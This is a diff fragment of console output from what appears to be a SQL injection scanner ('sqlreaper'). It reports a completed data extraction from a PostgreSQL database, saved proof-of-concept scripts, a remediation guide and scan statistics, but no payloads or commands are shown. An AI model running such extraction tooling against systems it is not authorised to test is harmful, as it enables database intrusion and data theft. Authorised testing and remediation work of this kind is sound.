+[!] --dump: no target table found; specify --table
+[+] --- Auto-extraction complete ---
+[+] Extraction report saved: output/extraction_report.json
+[+] PoC saved: output/poc/poc_s_B.sh, output/poc/poc_s_B.py
+[+] PoC: output/poc/poc_s_B.sh
+[+] Remediation guide: output/remediation_s_B.md
+[*] Extraction completed for 's'
+[*] Skipping 2 deferred extraction(s)  extraction already ran for []
+[+] 
+
+[+] Scan complete   30472.4s
+[+] Requests sent   53322
+[+] DBMS            PostgreSQL
+[+] WAF             unknown
+[+] Vulnerabilities 1 (s)
+[+] 
+[+] Deduplication: 2 findings  1 unique root causes
+[+] Report: 2 findings, 1 unique root causes
+[+] Report  output/sqlreaper_c4d63e71c042f62e_1789350994.json
+[+] Executive summary  output/executive_summary.txt
+[+] Confidence matrix  output/confidence_matrix.md
+[+] [Session] Scan complete  saved session cleared
+[+] Response dedup hit rate: 0.0%
